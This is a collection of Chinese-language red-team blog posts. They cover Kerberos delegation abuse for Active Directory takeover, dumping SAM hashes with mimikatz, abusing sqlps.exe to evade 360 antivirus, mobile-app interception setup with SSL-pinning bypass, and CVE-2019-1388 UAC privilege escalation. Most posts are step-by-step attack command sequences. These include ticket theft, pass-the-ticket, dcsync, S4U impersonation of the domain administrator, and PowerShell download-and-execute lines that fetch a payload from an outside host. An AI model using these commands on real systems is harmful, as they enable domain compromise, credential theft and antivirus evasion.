{"posts":[{"title":"test","content":"test ","link":"https://redteamblog.icu/post/test/"},{"title":"域委派利用","content":"本篇文章主要是对域渗透中的委派利用手法进行总结，但是没有写基于资源的委派，等日后补吭。中间多多少少参考了一些网上的文章，文末给出参考链接。 域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内可以委派的账户有两种，一种是 主机账户 ，另一种是 服务账户 (域用户通过注册SPN也可以成为服务账号)。 在域中只有服务账户和主机账户（即机器账户，一个普通域用户默认最多可以创建十个机器账户）才具有委派属性，也就说才能接受委派。 Kerberos委派主要分为三种： 非约束委派(Unconstrained Delegation) 约束委派(Constrained Delegation) 基于资源的约束委派(Resource-Based Constrained Delegation) 非约束委派和约束委派的流程，有兴趣的师傅可以去看看微软的手册。 下面简单介绍下Kerberos的各类委派， 如何配置 ， 如何发现 ， 实战场景中如何利用 。 以下是本地操作环境： 域：redteam.com 域控： 主域控：DC 系统：Windows Server 2016 IP：192.168.133.2 域内主机： Win-2008 IP：192.168.133.3 本地管理员：user1 Win-2016 IP：192.168.133.2 本地管理员：Administrator 域用户： 域管：redteam\\administrator 普通域用户：redteam\\user1 配置委派的域用户和服务账号：redteam\\test 委派前提 需要被委派的账户不能被设置为敏感账号，如下图所示 非约束委派 简介&amp;&amp;配置方法 对于非约束性委派（Unconstrained Delegation），服务账号可以获取被委派用户的TGT，并将TGT缓存到lsass进程中，从而服务账号可以使用该TGT，模拟用户访问任何服务。 非约束委派的设置需要SeEnableDelegation特权，该特权通常仅授予域管理员。配置了非约束委派的用户的userAccountControl属性有个FLAG位,TRUSTED_FOR_DELEGATION，对应是 0x80000 ，也就是 524288 。可以委派任何服务即为非约束委派。默认域内的域控均为非约束委派，可用于跨域（关于标志位值可参考：decoding-ad-useraccountcontrol-value） 打开&quot;Active Directory 用户和计算机-&gt;查看-&gt;高级功能&quot;，然后再查看用户属性即可看到（adsiedit.msc进ADSI编辑器也可以看到） 这里值为WORKSTATION_TRUST_ACCOUNT和TRUSTED_FOR_DELEGATION，所以为0x81000 非约束委派流程 非约束委派：当 user 访问 service1 时，如果 service1 的服务账号开启了 unconstrained delegation（非约束委派），则当 user 访问 service1 时会将 user 的 TGT 发送给 service1 并保存在内存中以备下次重用，然后 service1 就可以利用这张TGT 以 user的身份去访问域内的任何服务（任何服务是指user能访问的服务） https://www.cnblogs.com/zpchcbd/p/12939246.html 用户发送KRB_AS_REQ请求TGT（我们称为TGT1） KDC在KRB_AS_REP消息中返回TGT1 用户再通过TGT1请求可转发的TGT（我们称为TGT2） KDC在KRB_TGS_REP消息中返回可转发的TGT2**（票据属性中带有可转发的标记Forwarded）** 用户使用TGT1向TGS申请访问Service1的ST服务票据 TGS返回给用户一个ST服务票据 用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST服务票据、TGT2、TGT2的Session key**（这里TGT2和TGT2的Session key会被储存到Service1中，以便后续使用）** Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据ST2 KDC在KRB_TGS_REP消息中返回Service2到Service1的票据ST2 Service1以客户的名义用ST2发送KRB_AP_REQ请求 Service2响应步骤10中Service1的请求 Service1响应步骤7中用户的请求 在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务 KDC返回步骤13中请求的票据，15和16即为Service1通过模拟用户来访问其他服务 大致流程是：用户请求Service1，用户向KDC申请了访问Service1的ST服务票据和带有可转发标记的TGT票据，会一起发送给Service1，然后会被缓存到lsass中，后续Service就能使用那张可转发的TGT票据，以用户的身份申请其他任意服务的ST票据。对攻击者来说，如果使用DC或域管去访问Service1，那么就会在lsass内存中留下票据，就相当于直接拿下了域控。 查找域中配置非约束委派的主机/服务账户 查找域中配置非约束委派的主机/服务账户 AdFind（可在域外查询） 普通域用户执行： 查询域内配置非约束性委派的主机 AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn 查询域内配置非约束性委派的服务账号 AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn 注：默认域控是配置了非约束性委派的，所以查出来显示具有两个配置了非约束委派的计算机。 域外可指定域普通用户账密进行查找： #AdFind.exe -h 域控IP -u 域普通用户名 -up &quot;密码&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName #查询域中配置非约束委派的主机 AdFind.exe -h 192.168.133.2 -u redteam\\user1 -up &quot;1QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName #查询域中配置非约束委派的服务账户 AdFind.exe -h 192.168.133.2 -u redteam\\user1 -up &quot;1QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot;&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName SharpLDAPSearch 下载地址：SharpLDAPSearch 可以用ldap查询筛选，普通域用户下执行： 查找域中配置非约束委派的主机： SharpLDAPSearch.exe &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; &quot;samaccountname&quot; 查找域中配置非约束委派的用户： SharpLDAPSearch.exe &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; &quot;samaccountname&quot; 使用PowerView.ps1 PowerView-3.0 tips and tricks PowerView存在两个版本，有些功能只在dev版本中支持，但是我试了两个版本都不能直接查非约束委派的服务账户，所以这里用LDAP查询筛选 普通域用户下执行： #查询域中配置非约束委派的主机，下面俩一样 powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\\PowerView.ps1;Get-NetComputer -Domain redteam.com -Unconstrained | select samaccountname}&quot; powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\\PowerView.ps1;Get-DomainComputer -Domain redteam.com -Unconstrained | select samaccountname}&quot; #查询域中配置非约束委派的服务账户 powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\\PowerView.ps1;Get-DomainUser -Domain redteam.com -LDAPFilter userAccountControl:1.2.840.113556.1.4.803:=524288 | select name}&quot; SharpView.exe SharpView.exe 用法和PowerView.ps1一样,他的查询服务账户好像还是有点问题，所以这里还是用LDAP查询 #查询域中配置非约束委派的主机 SharpView.exe Get-NetComputer -Domain redteam.com -Unconstrained -Properties samaccountname #查询域中配置非约束委派的服务账户 SharpView.exe Get-DomainUser -Domain redteam.com -LDAPFilter userAccountControl:1.2.840.113556.1.4.803:=524288 -Properties samaccountname 非约束性委派攻击利用 https://y4er.com/post/kerberos-unconstrained-delegation/ https://www.freebuf.com/articles/web/303666.html 用户 user 去访问服务 service，如果服务 service 的服务账户开启了非约束性委派，那么当用户 user 访问服务 service 的时候会将用户 user 的 TGT 发送给服务 service 并保存在内存中以备下次重用，所以服务 service 能够利用用户 user 的身份去访问用户 user 能够访问的任意服务。 两种攻击方式，一种是诱使域管用户（相当于是域内钓鱼）来访问配置了非约束性委派的主机或服务，二是结合打印机漏洞让域管用户强制回连以缓存 TGT。 利用场景 当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt获取该用户权限。 mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit kerberos::ptt psexec64.exe \\\\DC2012.0ne.test -accepteula -s cmd 当然我们也可以诱导域管访问该主机，例如通过给管理员发诱饵文件修改Desktop.ini，或是outlook等等。详情可参考daiker师傅的发起NTLM请求。 域管在域控上点击此文件夹是就会访问win7，导出域管的TGT，ptt，psexec域控。 利用前提 需要非约束委派账户的主机本地管理员权限（需要从内存导出票据） 查找非约束委派时需要一个域账户 模拟域管去访问非约束性委派主机 1.以域管账户访问WIN-2008机器（主要是为了生成TGT）。 模拟域管用户 yg1（只要是域管用户，不一定在域控）远程访问非约束性委派主机机 Win-2008 ， Win-2008 已获得本地管理员权限。常见可利用钓鱼的连接方式可以是 MSSQL 或 IIS，这里演示域管用户 直接 IPC 连接 Win-2008 这时候 Win-2008 机器就已经有了域管 yg1 的 TGT 票据，可以用 mimikatz 导出lsass内存中所有票据。 3.使用mimikatz将票据导入内存中 #导入票据 mimikatz.exe &quot;kerberos::ptt [0;7a739]-2-0-60a10000-yg1@krbtgt-REDTEAM.COM.kirbi&quot; &quot;exit&quot; #查看票据 #也可mimikatz中查看：kerberos::list klist dcsync导出密码时也能获得访问域控LDAP的ST票据，可访问域控，一切正常： mimikatz.exe &quot;lsadump::dcsync /domain:redteam.com /all /csv&quot; &quot;exit&quot; &gt; ntds.txt 非约束委派+Spooler利用 在实战中，被动的非约束委派的利用需要和目标用户交互比较鸡肋。因此可以利用非约束委派+Spooler 打印机服务可以强制指定的主机进行连接。 非约束性委派主机结合 Spooler 打印机服务漏洞，让域控机器 DC 强制访问已控的具有本地管理员权限的非约束性委派机器 Win-2008 ，从而拿到域管理员的 TGT，进而接管域控 利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex)方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。 条件：目标机器（一般选域控）上需要开启Print Spooler服务（默认开启） https://www.cxyzjd.com/article/a3320315/106511098 https://www.cnblogs.com/nice0e3/p/15875685.html#powerview 首先利用Rubeus在 Win-2008 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器 DC 的登录信息 已编译的 Rubeus 下载：https://oss.zjun.info/file/Rubeus.exe 版本：https://github.com/GhostPack/Rubeus/releases/tag/1.6.4 1.使用Rubeus监听来自DC机器的4624登录日志**（需要本地管理员权限）** 如果不能cmd不能最大化窗口，可以先运行wmic，然后再最大化窗口，之后在exit回到cmd下 # /interval:1 设置监听间隔1秒 # /filteruser 监听域控，注意后面有个$，如果不设置监听对象就监听所有的TGT Rubeus.exe monitor /interval:1 /filteruser:DC$ 2.利用打印服务强制使DC访问WIN-7认证（可以不用管理员权限） 再利用SpoolSample强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行 已编译的 SpoolSample 下载：https://oss.zjun.info/file/SpoolSample.exe SpoolSample.exe DC WIN-7 WIN-7机器上接收到TGT票据 3.导出&amp;注入票据 如果使用mimikatz注入票据需要先进行一次转换 #使用mimikatz ##PowerShell下执行 [IO.File]::WriteAllBytes(&quot;.\\ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;去掉换行后的Base64编码的票据&quot;)) ##PTT mimikatz.exe &quot;kerberos::ptt ticket.kirbi&quot; &quot;exit&quot; #使用Rubeus ##可直接使用base64的TGT进行PTT Rubeus.exe ptt /ticket:去掉换行后的Base64编码的票据 注：这里获得的是域控机器账户的TGT票据 接下来解密 NTLM hash 后可以直接登录域控，解不开也可以利用 krbtgt 的 NTLM hash 用于做黄金票据权限维持，可以参考：https://blog.zjun.info/2020/kerberos-protocol-to-ticket-forgery.html#cl-8 约束委派 简介&amp;配置方法 由于非约束委派的不安全性，微软在Windows Server 2003中发布了约束性委派（Constrained Delegation），还扩充了Kerberos协议，添加了S4u2self(Service for User to Self)和S4u2Proxy(Service for User to Proxy )子协议，服务账号只能获取用户的TGS，从而只能模拟用户访问特定的服务。配置了约束委派的账户的msDS-AllowedToDelegateTo属性会指定对哪个进行委派。**相较于非约束委派，约束委派最大的区别也就是配置的时候选择某个特定的服务，而不是所有服务。**约束委派的设置同样需要SeEnableDelegation特权，该特权通常仅授予域管理员 当服务账号或者主机被设置为约束性委派时，其userAccountControl属性包含TRUSTED_TO_AUTH_FOR_DELEGATION，且msDS-AllowedToDelegateTo属性会包含被约束的服务。 点击&quot;添加-&gt;选择委派的计算机-&gt;选择委派的服务&quot;即可新增。 小提示 如果我们可以攻破配置约束委派的服务账户(获取密码/Hash)，我们就可以模拟域内任意用户(如 domain\\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）。 此外，我们不仅可以访问约束委派配置中用户可以模拟的服务， 还可以访问使用与模拟帐户权限允许的任何服务。 （因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意如果我们有权限访问到 DC 的 LDAP 服务，则有足够的权限去执行 DCSync。 如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。 userAccountControl属性： msDS-AllowedToDelegateTo属性： 注册个用户为服务账号方便后面复现（域管操作） #创建个域用户 net user SqlServer S123456@#!1 /domain /add #注册SPN，将SqlServer用户注册为服务账号 setspn -U -A SQLServer/WIN2008.redteam.com:1433/MSSQL SqlServer #查找指定SqlServer用户注册的SPN setspn -L SqlServer 然后在域控中将SqlServer用户配置为约束性委派，方便演示直接配置为域控的CIFS协议 约束委派流程 用户向Service1发起请求 Service1通过S4U2self模拟用户向KDC请求获得Service1自身服务的可转发的ST服务票据 KDC返回给Service1一个用于Service1自身服务的带有可转发标志的ST服务票据（这里假设称为ST1），并且Service1用这个ST1完成和用户的验证过程。 Service1在步骤3使用模拟用户申请的ST1票据（带有Forwardable标记）完成与用户的验证，然后响应用户。 用户再次向Service1发起请求。（这里有两点：Service1已经验证通过，并且有一个有效的带有Forwardable标记的TGT、Service1有从用户请求Service1的带有Forwardable标记的ST1） 然后Service1通过S4U2proxy代表用户用ST1（带有Forwardable标记，在S4U2SELF阶段获得的TGS票据，会放在AddtionTicket字段中）向KDC请求一个用于认证Service2的ST（这里假设称为ST2）。通过ST1中的cname（client name）和crealm（client realm）字段标识用户。 KDC在接收到步骤6中Service1的请求之后，进行验证，然后返回Service2的服务票据ST2（带有Forwardable标记） Service1代表用户使用ST2请求Service2。 Service2响应Service1的请求。 Service1响应用户的请求。 从攻击者的角度来看就是如果攻击者控制了Service1的账号，并且Service1配置了到Service2服务的约束性委派。则攻击者可以利用Service1以administrator身份Service2。 查找域中配置约束委派的主机/服务账户 AdFind（可在域外查询） 普通域用户执行： #查找域中配置约束委派的主机及服务 AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto #查找域中配置约束委派的服务账户及服务 AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto 域外可指定域普通用户账密进行查找： #AdFind.exe -h 域控IP -u 域普通用户名 -up &quot;密码&quot; -b &quot;DC=xx,DC=xx&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto #查询域中配置约束委派的主机及服务 AdFind.exe -h 192.168.133.2 -u redteam\\user1 -up &quot;1QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto #查询域中配置约束委派的服务账户及服务 AdFind.exe -h 192.168.133.2 -u redteam\\user1 -up &quot;1QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto 配置了约束委派的机器 这是配置了约束委派的服务账户。 SharpLDAPSearch 下载地址：SharpLDAPSearch 可以用ldap查询筛选，普通域用户下执行： 查找域中配置约束委派的主机 SharpLDAPSearch.exe &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; &quot;samaccountname&quot; 查找域中配置约束委派的服务账户 SharpLDAPSearch.exe &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; &quot;samaccountname&quot; PowerView.ps1 #查找域中配置约束委派的主机 powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\\PowerView.ps1;Get-DomainComputer -Domain redteam.com -TrustedToAuth -Properties distinguishedname,samaccountname,useraccountcontrol,msds-allowedtodelegateto|fl}&quot; #查找域中配置约束委派的服务账户 powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\\PowerView.ps1;Get-DomainUser -Domain redteam.com –TrustedToAuth -Properties distinguishedname,samaccountname,useraccountcontrol,msds-allowedtodelegateto|fl}&quot; SharpView.exe #查找域中配置约束委派的主机 SharpView.exe Get-DomainComputer -Domain redteam.com -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto #查找域中配置约束委派的服务账户 SharpView.exe Get-DomainUser -Domain redteam.com -LDAPFilter msds-allowedtodelegateto=* -Properties distinguishedname,samaccountname,useraccountcontrol,msds-allowedtodelegateto 约束性委派攻击利用 https://blog.csdn.net/qq_36119192/article/details/104538160 https://www.redteaming.top/2020/02/11/域渗透——Kerberos委派攻击/ 域外机器也执行 服务用户只能获取某个用户（或主机）的服务的 ST，所以只能模拟用户访问特定的服务，是无法获取用户的 TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者 NTLM Hash ，我们就可以伪造 S4U 请求，进而伪装成服务用户以任意账户的权限申请访问指定服务的 ST。 已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的 TGT。 注： 在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。 服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录。 使用kekeo kekeo 1.使用kekeo申请TGT票据 #密码明文方式 tgt::ask /user:test /domain:redteam.com /password:P@ssw0rd kekeo.exe &quot;tgt::ask /user:SqlServer /domain:redteam.com /password:S123456@#!1&quot; &quot;exit&quot; #密码NTLM方式 kekeo.exe &quot;tgt::ask /user:SqlServer /domain:redteam.com /NTLM:77e3527e2a110b7e30659749718f54f9&quot; &quot;exit&quot; 2.请求域控CISF服务的ST票据 使用这张 TGT 通过伪造 S4U 请求以 administrator 用户身份请求访问 DC CIFS 的 ST #需要使用上面申请的TGT票据 kekeo.exe &quot;tgs::s4u /tgt:TGT_SqlServer@REDTEAM.COM_krbtgt~redteam.com@REDTEAM.COM.kirbi /user:Administrator@redteam.com /service:cifs/dc.redteam.com&quot; &quot;exit&quot; 结果生成了两张ST票据，一张是通过S4U2Self请求SqlServer自身的ST票据，一张是通过S4U2Proxy获得的请求CIFS的ST票据 然后用 域内机器上mimikatz 将 ST2 导入当前会话，即可成功访问域控 DC mimikatz.exe &quot;kerberos::ptt TGS_Administrator@redteam.com@REDTEAM.COM_cifs~dc.redteam.com@REDTEAM.COM.kirbi&quot; &quot;exit&quot; 成功访问到域控资源。 如果不知道服务用户明文的情况下，kekeo 同样也支持使用 NTLM Hash，在请求服务用户的 TGT 那步直接把 /password 改成 /NTLM 即可 # kekeo tgt::ask /user:test /domain:zjun.com /NTLM:e19ccf75ee54e06b06a5907af13cef42 如果不知道服务用户的明文和 NTLM Hash，但是已有服务用户登陆的主机的本地管理员权限，可以用 mimikatz 直接从内存中把服务用户的 TGT 导出 mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit 服务用户的 TGT 导出后，就可以通过伪造 S4U 请求以 administrator 用户身份请求访问 P-DC CIFS 的 ST # kekeo tgs::s4u /tgt:[0;8f613]-2-0-40e10000-test@krbtgt-ZJUN.COM.kirbi /user:Administrator@zjun 使用Rubeus 和上面的流程一样，就不贴图了 #因为Rubeus不支持明文密码，所以先转换成hash Rubeus.exe hash /password:S123456@#!1 #1.申请TGT票据，获得base64格式的TGT Rubeus.exe asktgt /user:SqlServer /rc4:77E3527E2A110B7E30659749718F54F9 /domain:redteam.com #2.powershell下转换为正常格式 [IO.File]::WriteAllBytes(&quot;.\\ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;去掉换行后的base64&quot;)) #3.请求域控CISF服务的ST票据并注入 Rubeus.exe s4u /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:cifs/dc.redteam.com /ptt 一步到位： Rubeus.exe s4u /user:SqlServer /rc4:77E3527E2A110B7E30659749718F54F9 /impersonateuser:administrator /msdsspn:cifs/dc.redteam.com /ptt 使用impacket包 执行命令的话建议选择impacket包，用mimikatz进行ptc的话也是用不了impacket包的如smbexec工具执行命令的,需要指定KRB5CCNAME #1. 请求访问域控CIFS的ST票据 #impersonate：伪造用户 #spn：要委派的服务的spn #dc-ip：域控ip python3 getST.py -dc-ip 172.16.1.1 -impersonate administrator bean/SqlServer:S123456@#!1 -spn cifs/dc.bean.testlab #2. 导入cache ##2.1 Windows下 set KRB5CCNAME=administrator.ccache ##2.2 Linux下 export KRB5CCNAME=administrator.ccache #3. 拿到域控权限 python3 smbexec.py -no-pass -k dc.bean.testlab 参考 https://www.anquanke.com/post/id/173477 https://blog.zjun.info/tech/kerberos-domain-delegation-attack/ https://cloud.tencent.com/developer/article/1899592 ","link":"https://redteamblog.icu/post/域委派/"},{"title":"使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH","content":"场景 已获取system权限，有杀毒难以突破的时候，这个时候可以通过reg命令导出SAM和SYSTEM文件来离线解密。 利用方式 1.首先导出两个文件。 reg save hklm\\sam sam.hive reg save hklm\\system system.hive 然后将这两个hive文件放到和Mimikatz同一个目录下。 运行mimikatz执行命令 lsadump::sam /sam:sam.hive /system:system.hive 获得NTLM哈希。 参考 https://forum.butian.net/share/259 内网渗透-获取明文和hash ","link":"https://redteamblog.icu/post/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/"},{"title":"sqlps.exe白名单的利用（过360！）","content":"目录位置 C:\\Program Files (x86)\\Microsoft SQL Server\\100\\Tools\\Binn\\sqlps.exe C:\\Program Files (x86)\\Microsoft SQL Server\\110\\Tools\\Binn\\sqlps.exe C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\sqlps.exe C:\\Program Files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe C:\\Program Files (x86)\\Microsoft SQL Server\\140\\Tools\\Binn\\sqlps.exe C:\\Program Files (x86)\\Microsoft SQL Server\\150\\Tools\\Binn\\sqlps.exe sqlps执行上线 SQLPS -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))&quot; 绕过360 SQLPS1 -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))&quot; cmd /c SQLPS -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))&quot; declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\ProgramData\\SQLPS.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(''http://192.168.1.120/360.ps1''))&quot;' 执行命令： exec(&quot;cmd.exe /c &quot;C:\\Program Files (x86)\\Microsoft SQL Server\\100\\Tools\\Binn\\SQLPS.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://www.xxx.com:80/a'))&quot;&quot;); 参考 https://cn-sec.com/archives/835205.html ","link":"https://redteamblog.icu/post/sqlpsexe-bai-ming-dan-de-li-yong-guo-360/"},{"title":"APP安全测试-模拟器环境配置","content":"模拟器选择 1.逍遥模拟器（以弃用） //原因是因为做好环境之后开机总是提示你重新修复环境。 2.雷电模拟器（现用） //有一个问题就是4.0的雷电模拟器挂了WIFI代理之后失效，需要使用ADB增加代理或者使用profile之类的软件进行中转代理。 版本的选择 1.很多APP现已经不支持7.0系统一下，所以尽量安装7.0的安卓模拟器。 2.7.0安装XP框架较为麻烦，需要找到对应的包，因此使用一键安装XP框架解决。 证书配置 按照网上那些老掉牙的文章，都是导出一个Burp/Charles证书之后，adb push到模拟器，然后修改后缀为crt直接安全，这种方式在Android 6及之前的版本可用，从Android 7.0开始，Android更改了信任用户安装的证书的默认行为，应用程序仅信任系统级CA。这样就导致安装证书后，如果尝试通过Burp或者Charlse代理访问https网站，系统会提示“该证书并非来自可信的授权中心”： 因为安卓安全机制的原因，7.0以上的系统，安装BURP证书需要打到系统信任里面，这里需要对BURP的证书做一些设置，如下： 导出Burp的证书后，使用openssl来做一些改动： openssl x509 -inform DER -in cacert.der -out cacert.pem 查看pem证书的hash值并记录，命令如下： openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1 将pem证书改名为“hash值.0”： mv cacert.pem 9a5ba575.0 然后使用adb将.0文件push到模拟器的/system/etc/security/文件夹中，并将权限修改为644： adb push &lt;hash&gt;.0 /system/etc/security/cacerts adb shell chmod 644 /system/etc/security/cacerts/&lt;hash&gt;.0 如果更改不了权限，就使用adb remount来解除分区限制后导入，如下： 最后能看到信任证书在系统里面即可。 安装Xpoesd框架 之前提到了，安装很有问题，所以借用别人的经验采取一键安装。 Xposed_Android_7x64.exe 此文件适用于64位模拟器，系统为Android7的版本，不适用于夜神，请勿使用。 放在模拟器根目录执行，等待重启即可。 绕过双向验证 有的时候因为app会对服务器端的证书进行校验, 这时候我们前面安装的burp就不起作用了, 应用在发现证书是伪造的情况下拒绝发送请求。根据这个报错+抓不到包, 我们可以确定应用是存在单向校验的, 也就是SSL pinning, 让我们先来解决SSL pinning的问题。使用JustTrustMe可以绕过客户端的证书校验, 下面勾选上JustTrustMe, 在Xposed框架下使用JustTrustMe绕过SSL pinning。 雷电模拟器增加代理 之前提到过，要么使用中转配置，要么使用ADB 我这里增加的ADB配置。 添加代理 adb shell settings put global http_proxy 192.168.4.199:8888 移除代理 adb shell settings delete global http_proxy&amp;adb shell settings delete global global_http_proxy_host&amp;adb shell settings delete global global_http_proxy_port 或者没有delete命令时 adb shell settings put global http_proxy :0 暂时只记录这么多吧。 ","link":"https://redteamblog.icu/post/APP安全测试-模拟器踩坑记/"},{"title":"CVE-2019-1388：通过 UAC 进行 Windows 提权","content":"CVE-2019-1388：通过 UAC 进行 Windows 提权 0x01 漏洞介绍 CVE-2019-1388 | Windows证书对话框特权提升漏洞发布时间：11/12/2019如果 Windows 证书对话框没有正确执行用户特权，则存在特权提升漏洞。成功利用此漏洞的攻击者可以在提升的环境中运行进程。然后，攻击者可能会安装程序，查看、更改或删除数据。要利用此漏洞，攻击者首先必须以普通用户权限登录系统。然后攻击者运行一个精心调制的应用，该应用可以利用此漏洞并控制受影响的系统。该安全更新通过确保 Windows 证书对话框正确执行用户特权来解决该漏洞。 0x02 漏洞原理 此漏洞是因为 UAC（用户账户控制）机制的设定不严导致的。 默认情况下， Windows 在称为「安全桌面」的单独桌面上显示所有 UAC 提示。提示本身是由名为 consent.exe 的可执行文件生成的，该可执行文件以 NT AUTHORITY\\SYSTEM 身份运行并且有 System 的完整性水平。 https://leanote.com/api/file/getImage?fileId=5dd53e1aab644109b0001af6 由于用户可以与此安全桌面的 UI 进行交互，因此有必要对 UI 进行严格限制。否则，低特权用户可能能够通过 UI 操作的路由回路以 SYSTEM 的身份执行操作。甚至看起来无害的单独 UI 功能也可能是导致任意控制的一系列操作的第一步。 另一个需要了解的东西是 OID，如果在运行一个可执行文件的时候我们触发了 UAC，在点击「展示证书发行者的详细信息」这个链接之后： https://leanote.com/api/file/getImage?fileId=5dd5412bab644109b0001b23 我们可以看到证书里的 Issued by 字段，这个字段对应的值就是 OID。 https://leanote.com/api/file/getImage?fileId=5dd5424eab64410bb1001bdc 注意对比下两图中 OID 的不同： https://leanote.com/api/file/getImage?fileId=5dd542bdab64410bb1001be2 https://leanote.com/api/file/getImage?fileId=5dd542f7ab644109b0001b43 证书会解析 OID 的值，可能显示为超链接。但是 Windows 忘记禁用了 OID 处的超链接，这就给了我们提权的可能。 当 OID 为超链接时，通过点击此链接会触发 consent.exe 以 SYSTEM 权限打开浏览器访问此链接，然后此浏览器就会有 SYSTEM 权限。通过保存该浏览页面，会弹出微软的资源管理器，在资源管理器中邮件打开 cmd.exe 程序，就会继承浏览器的 SYSTEM 权限，由此就完成了由普通用户到 NT AUTHORITY\\SYSTEM 用户的提权！ 0x03 漏洞利用实例 以 Windows 7 为例： 先检查下补丁打了没有： systeminfo&gt;snowming.txt&amp;(for %i in (KB4525235 KB4525233) do @type snowming.txt|@find /i &quot;%i&quot;|| @echo no this padding: %i)&amp;del /f /q /a snowming.txt https://leanote.com/api/file/getImage?fileId=5dd7aeabab64414b9f001bdf 没有打补丁，当前用户是 guest。 这个漏洞利用的精髓在于运行的软件，用来触发 UAC 「安全桌面」的软件的 OID 一定要解析为超链接。这样才能触发 consent.exe 以 SYSTEM 权限打开浏览器访问这个链接。并且当然链接要能打开才行。 在目标 Windows 7- vs 2010 机器上，我从我的 C2 下载了 hhupd.exe 软件。 https://leanote.com/api/file/getImage?fileId=5dd5473fab64410bb1001c2c https://leanote.com/api/file/getImage?fileId=5dd5478dab64410bb1001c2f Unblock 之后 run as administrator，就能触发 UAC 的安全桌面，查看证书详情： https://leanote.com/api/file/getImage?fileId=5dd547fdab644109b0001b7f 点击此超链接就能打开浏览器页面，保存： https://leanote.com/api/file/getImage?fileId=5dd54886ab644109b0001b89 注意我们要在这里通过资源管理器中邮件打开 cmd.exe 程序，这样才能继承浏览器的 SYSTEM 权限。 https://leanote.com/api/file/getImage?fileId=5dd548f9ab64410bb1001c46 在 File name 一栏里输入 C:\\Windows\\System32\\*.*，然后 https://leanote.com/api/file/getImage?fileId=5dd549faab64410bb1001c55 cmd.exe → open，提权成功： https://leanote.com/api/file/getImage?fileId=5dd54ad1ab64410bb1001c61 